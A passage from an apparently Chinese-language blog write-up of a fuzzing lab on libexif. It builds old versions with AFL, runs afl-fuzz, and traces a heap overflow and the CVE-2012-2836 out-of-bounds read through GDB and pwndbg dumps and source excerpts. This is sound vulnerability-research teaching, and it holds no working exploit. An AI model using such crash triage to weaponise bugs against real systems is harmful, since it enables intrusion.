<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/libexif-0.6.18 # 使用afl-clang-lto编译器构建libexif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">rm -r $HOME/fuzzing_libexif/tool</span><br><span class="line">cd $HOME/exif-exif-0_6_15-release  # 使用afl-clang-lto编译器构建exif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/tool/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>开始 fuzz：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /home/yhellow/fuzzing_libexif/exif-samples/jpg/ -o /home/yhellow/fuzzing_libexif/out -s 123 -- /home/yhellow/fuzzing_libexif/tool/bin/exif @@</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660457762859.png" class width="1660457762859"> 
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./exif test.<span class="function">jpg                                                                                                                          </span></span><br><span class="line"><span class="function"><span class="title">realloc</span><span class="params">()</span>: invalid next size</span></span><br><span class="line"><span class="function">[1]    2564 <span class="built_in">abort</span>      ./exif test.jpg</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发生错误，看起来像是堆溢出（victim chunk 的 next chunk-&gt;size 被破坏）</li>
<li>使用 GDB <code>bt</code> 命令查看栈回溯</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660525309142.png" class width="1660525309142"> 
<ul>
<li>函数 <code>exif_content_fix</code> 中发生了堆溢出（最好不要直接根据函数名来找源码，可以通过后面的 <code>文件名+偏移</code> 来找）</li>
<li>在 <code>exif_content_fix</code> 上打断点，结合源码进行调试，发现 <code>exif_content_fix</code> 执行两次以后发生错误，于是在 <code>realloc</code> 上打断点，用 <code>bt</code> 回溯栈：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660526920225.png" class width="1660526920225"> 
<ul>
<li>定位到的代码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">exif_mem_realloc</span> <span class="params">(ExifMem *mem, <span class="keyword">void</span> *d, ExifLong ds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (mem &amp;&amp; mem-&gt;realloc_func) ? mem-&gt;realloc_func (d, ds) : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x238994</span> &lt;exif_content_fix+<span class="number">6756</span>&gt;    call   rcx                           &lt;exif_mem_realloc_func&gt;</span><br><span class="line">        rdi: <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line">        rsi: <span class="number">0x600</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0000000000238996</span><span class="number">-0x2</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x238994</span> (exif_content_fix+<span class="number">6756</span>) ◂— call   rcx</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x23899c</span> (exif_content_fix+<span class="number">6764</span>) ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x2389a4</span> (exif_content_fix+<span class="number">6772</span>) ◂— add    al, byte ptr [rax]</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x2389ac</span> (exif_content_fix+<span class="number">6780</span>) ◂— add    dl, <span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>继续打断点调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x238994</span> &lt;exif_content_fix+<span class="number">6756</span>&gt;    call   rcx                           &lt;exif_mem_realloc_func&gt;</span><br><span class="line">       rdi: <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line">       rsi: <span class="number">0x600</span></span><br></pre></td></tr></table></figure>
<ul>
<li>找到目标堆：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x46fe40</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x46fe30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x46fe38</span> ◂— <span class="number">0x311</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rdi <span class="number">0x46fe40</span> ◂— <span class="number">0x100000001000100</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x46fe48</span> ◂— <span class="number">0x100000000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x46fe50</span> ◂— <span class="number">0x0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; telescope <span class="number">0x46fe30</span>+<span class="number">0x310</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x470140</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现 <code>0x470140</code> 处的 chunk 已经被破坏，可能是从 <code>0x46fe30</code> 中溢出的数据破坏了该 chunk，接下来的思路就是寻找往 <code>0x46fe30</code> 中写入数据的函数</li>
<li>本来想同样的方法，在 <code>malloc</code> 上打断点，然后回溯栈 ，结果发现 <code>0x46fe30</code> 已经被申请了，但是还没有写入，所以就直接单步硬找目标函数，最后找到了 <code>exif_entry_fix</code> 函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exif_entry_fix</span> <span class="params">(ExifEntry *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	ExifByteOrder o;</span><br><span class="line">	ExifRational r;</span><br><span class="line">	ExifSRational sr;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">			memmove (e-&gt;data + <span class="number">8</span>, e-&gt;data, e-&gt;size);</span><br><span class="line">			<span class="built_in">memcpy</span> (e-&gt;data, <span class="string">&quot;ASCII\0\0\0&quot;</span>, <span class="number">8</span>);</span><br><span class="line">			e-&gt;size += <span class="number">8</span>;</span><br><span class="line">			e-&gt;components += <span class="number">8</span>;</span><br><span class="line">			exif_entry_log (e, EXIF_LOG_CODE_DEBUG,</span><br><span class="line">				_(<span class="string">&quot;Tag &#x27;UserComment&#x27; has been expanded to at &quot;</span></span><br><span class="line">				<span class="string">&quot;least 8 bytes in order to follow the &quot;</span></span><br><span class="line">				<span class="string">&quot;specification.&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;ASCII\0\0\0&quot;</span>     , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;UNICODE\0&quot;</span>       , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;JIS\0\0\0\0\0&quot;</span>   , <span class="number">8</span>) &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span> (e-&gt;data, <span class="string">&quot;\0\0\0\0\0\0\0\0&quot;</span>, <span class="number">8</span>)) &#123;</span><br><span class="line">			e-&gt;data = exif_entry_realloc (e, e-&gt;data, <span class="number">8</span> + e-&gt;size); <span class="comment">/* 调用realloc */</span></span><br><span class="line">			<span class="keyword">if</span> (!e-&gt;data) &#123;</span><br><span class="line">				e-&gt;size = <span class="number">0</span>;</span><br><span class="line">				e-&gt;components = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            </span><br><span class="line">    ...... </span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其函数有大量的 <code>memmove</code> <code>memcpy</code> 等函数，极有可能就是它们导致了堆溢出（<code>exif_mem_realloc</code> 也是在这里调用的），于是在 <code>memcpy</code> 上打断点，进行调试</li>
<li>发现执行 54 次 <code>memcpy</code> 后程序崩溃，于是对比第 54 次 <code>memcpy</code> 执行前后的 heap 空间变化，发现 <code>0x46fe30</code> 中并没有写入数据，只能单步继续跟进了</li>
<li>由于 <code>exif_entry_realloc</code> 无法下断点，最后还是没有找到溢出点</li>
</ul>
<h2 id="CVE-2012-2836"><a href="#CVE-2012-2836" class="headerlink" title="CVE-2012-2836"></a>CVE-2012-2836</h2><h2 id="Download-and-build-your-target-1"><a href="#Download-and-build-your-target-1" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://sourceforge.net/projects/libexif/files/libexif/0.6.14/libexif-0.6.14.tar.gz # 获取libexif</span><br><span class="line">tar -zxvf libexif-0.6.14.tar.gz</span><br><span class="line"></span><br><span class="line">cd $HOME/libexif-0.6.14 # 使用afl-clang-lto编译器构建libexif</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install2/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/exif-exif-0_6_15-release  # 使用afl-clang-lto编译器构建exif</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/tool2/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install2/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h2 id="Fuzz-exif-1"><a href="#Fuzz-exif-1" class="headerlink" title="Fuzz exif"></a>Fuzz exif</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i /home/yhellow/fuzzing_libexif/exif-samples/jpg -o /home/yhellow/fuzzing_libexif/out2 -s 123 -- /home/yhellow/fuzzing_libexif/tool2/bin/exif @@</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660539954254.png" class width="1660539954254"> 
<h2 id="Reproduce-the-crash-1"><a href="#Reproduce-the-crash-1" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./exif test.jpg </span><br><span class="line">[<span class="number">1</span>]    <span class="number">1101259</span> segmentation fault  ./exif test.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>发生段错误，在 GDB 中使用 <code>bt</code> 命令：</li>
</ul>
<img src="/2022/08/15/Fuzz%20Lab2-libexif/1660540799028.png" class width="1660540799028">  
<ul>
<li>段错误发生在 <code>exif_data_load_data</code> 调用的 <code>exif_get_sshort</code> 函数中，源码如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExifSShort</span></span><br><span class="line"><span class="function"><span class="title">exif_get_sshort</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (order) &#123;</span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_MOTOROLA:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">1</span>]); <span class="comment">/* target */</span></span><br><span class="line">        <span class="keyword">case</span> EXIF_BYTE_ORDER_INTEL:</span><br><span class="line">                <span class="keyword">return</span> ((buf[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | buf[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Won&#x27;t be reached */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">	EXIF_BYTE_ORDER_MOTOROLA,	<span class="comment">/* &#x27;0&#x27; */</span></span><br><span class="line">	EXIF_BYTE_ORDER_INTEL		<span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">&#125; ExifByteOrder;</span><br></pre></td></tr></table></figure>
<ul>
<li>单步调试，发现程序执行到以下代码时就停止了：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x22bc6f</span> &lt;exif_data_load_data+<span class="number">1407</span>&gt;    movzx  esi, word ptr [rcx]</span><br></pre></td></tr></table></figure>
<ul>
<li>[rcx] 显然不合法，猜测传入 <code>exif_get_sshort</code> 的参数有误</li>
<li>在 <code>exif_data_load_data</code> 中单步调试，寻找调用 <code>exif_get_sshort</code> 并引发段错误的地方：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exif_data_load_data</span> <span class="params">(ExifData *data, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *d_orig,</span></span></span><br><span class="line"><span class="params"><span class="function">		     <span class="keyword">unsigned</span> <span class="keyword">int</span> ds_orig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="comment">/* Fixed value */</span> </span><br><span class="line">	<span class="keyword">if</span> (exif_get_short (d + <span class="number">8</span>, data-&gt;priv-&gt;order) != <span class="number">0x002a</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IFD 0 offset */</span></span><br><span class="line">	offset = exif_get_long (d + <span class="number">10</span>, data-&gt;priv-&gt;order);</span><br><span class="line">	exif_log (data-&gt;priv-&gt;<span class="built_in">log</span>, EXIF_LOG_CODE_DEBUG, <span class="string">&quot;ExifData&quot;</span>, </span><br><span class="line">		  <span class="string">&quot;IFD 0 at %i.&quot;</span>, (<span class="keyword">int</span>) offset);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Parse the actual exif data (usually offset 14 from start) */</span></span><br><span class="line">	exif_data_load_data_content (data, EXIF_IFD_0, d + <span class="number">6</span>, ds - <span class="number">6</span>, offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IFD 1 offset */</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> &gt; ds) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	n = exif_get_short (d + <span class="number">6</span> + offset, data-&gt;priv-&gt;order); <span class="comment">/* targrt */</span></span><br><span class="line">	<span class="keyword">if</span> (offset + <span class="number">6</span> + <span class="number">2</span> + <span class="number">12</span> * n + <span class="number">4</span> &gt; ds) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：程序通过 <code>exif_get_short</code> 来调用 <code>exif_get_sshort</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExifShort</span></span><br><span class="line"><span class="function"><span class="title">exif_get_short</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, ExifByteOrder order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (exif_get_sshort (buf, order) &amp; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 GDB 中定位到对应的位置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x7</span></span><br><span class="line"> RBX  <span class="number">0x453</span></span><br><span class="line"> RCX  <span class="number">0x100452c45</span></span><br><span class="line"> RDX  <span class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line">*RDI  <span class="number">0x453120</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf */</span></span><br><span class="line"> RSI  <span class="number">0x0</span> <span class="comment">/* order */</span></span><br><span class="line"> R8   <span class="number">0xffffffff</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x224ab0</span> (log_func_exit) ◂— push   rbp</span><br><span class="line"> R11  <span class="number">0x7ffff7e4ebe0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x454700</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R12  <span class="number">0x452c46</span> ◂— <span class="number">0xffffffff2a004d4d</span> <span class="comment">/* &#x27;MM&#x27; */</span></span><br><span class="line"> R13  <span class="number">0x453108</span> —▸ <span class="number">0x453120</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x4530d0</span> —▸ <span class="number">0x453160</span> ◂— <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x452c40</span> ◂— <span class="number">0x4d4d000066697845</span> <span class="comment">/* &#x27;Exif&#x27; */</span></span><br><span class="line"> RBP  <span class="number">0xffffffff</span> <span class="comment">/* 异常 */</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffc5d0</span> ◂— <span class="number">0x5b0000006e</span> <span class="comment">/* &#x27;n&#x27; */</span></span><br><span class="line">*RIP  <span class="number">0x22bc13</span> (exif_data_load_data+<span class="number">1315</span>) ◂— mov    edx, dword ptr [rdi]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x22bbca</span> &lt;exif_data_load_data+<span class="number">1242</span>&gt;    cmp    eax, ebx</span><br><span class="line">   <span class="number">0x22bbcc</span> &lt;exif_data_load_data+<span class="number">1244</span>&gt;    jbe    exif_data_load_data+<span class="number">1306</span>                      &lt;exif_data_load_data+<span class="number">1306</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x22bc0a</span> &lt;exif_data_load_data+<span class="number">1306</span>&gt;    mov    ecx, ebp</span><br><span class="line">   <span class="number">0x22bc0c</span> &lt;exif_data_load_data+<span class="number">1308</span>&gt;    add    rcx, r12</span><br><span class="line">   <span class="number">0x22bc0f</span> &lt;exif_data_load_data+<span class="number">1311</span>&gt;    mov    rdi, qword ptr [r13]</span><br><span class="line"> ► <span class="number">0x22bc13</span> &lt;exif_data_load_data+<span class="number">1315</span>&gt;    mov    edx, dword ptr [rdi]</span><br><span class="line">   <span class="number">0x22bc15</span> &lt;exif_data_load_data+<span class="number">1317</span>&gt;    test   edx, edx</span><br><span class="line">   <span class="number">0x22bc17</span> &lt;exif_data_load_data+<span class="number">1319</span>&gt;    je     exif_data_load_data+<span class="number">1384</span>                      &lt;exif_data_load_data+<span class="number">1384</span>&gt; <span class="comment">/* if (!buf) return 0; */</span></span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x22bc58</span> &lt;exif_data_load_data+<span class="number">1384</span>&gt;    mov    rsi, qword ptr [rip + <span class="number">0x1f7a9</span>] &lt;<span class="number">0x24b408</span>&gt;</span><br><span class="line">   <span class="number">0x22bc5f</span> &lt;exif_data_load_data+<span class="number">1391</span>&gt;    mov    al, byte ptr [rsi + <span class="number">0x48b</span>]</span><br><span class="line">   <span class="number">0x22bc65</span> &lt;exif_data_load_data+<span class="number">1397</span>&gt;    add    al, <span class="number">1</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x453120</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x453120</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf[0] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x453128</span> ◂— <span class="number">0x0</span> <span class="comment">/* buf[1] */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x453130</span> —▸ <span class="number">0x452b90</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x453138</span> —▸ <span class="number">0x452bc0</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x453140</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x453148</span> ◂— <span class="number">0x400000003</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x453150</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x453158</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调试后发现一些信息：<ul>
<li><code>exif_get_sshort</code> 的两个参数 <code>buf</code> <code>order</code>（已经标出）</li>
<li><code>RBP</code> 的值异常</li>
</ul>
</li>
<li>后来发现 <code>[rcx]</code> 不合法是由 <code>RBP</code> 异常导致的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*RCX  <span class="number">0xffffffff</span></span><br><span class="line"> RBP  <span class="number">0xffffffff</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x22bc0a</span> &lt;exif_data_load_data+<span class="number">1306</span>&gt;    mov    ecx, ebp <span class="comment">/* ecx == RBP */</span></span><br><span class="line"> ► <span class="number">0x22bc0c</span> &lt;exif_data_load_data+<span class="number">1308</span>&gt;    add    rcx, r12</span><br></pre></td></tr></table></figure>
<p>现在的问题就很明了了：</p>
<ul>
<li>因为 <code>[rcx]</code> 不合法导致了段错误</li>
<li>因为 <code>RBP</code> 异常导致了 <code>[rcx]</code> 不合法</li>
</ul>
<p>现在只要找到导致 <code>RBP</code> 异常的代码就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x22b864</span> &lt;exif_data_load_data+<span class="number">372</span>&gt;    mov    rbp, qword ptr [rcx + <span class="number">0x10</span>]</span><br><span class="line">► <span class="number">0x22b868</span> &lt;exif_data_load_data+<span class="number">376</span>&gt;    test   eax, eax</span><br><span class="line">      </span><br><span class="line">  <span class="number">0x22bb8a</span> &lt;exif_data_load_data+<span class="number">1178</span>&gt;    mov    ebp, dword ptr [r15 + <span class="number">0xa</span>]</span><br><span class="line">► <span class="number">0x22bb8e</span> &lt;exif_data_load_data+<span class="number">1182</span>&gt;    bswap  ebp</span><br></pre></td></tr></table></figure>
<ul>
<li>程序直接控制了 <code>RBP</code>，对应源码如下：（第二处）</li>
</ul>
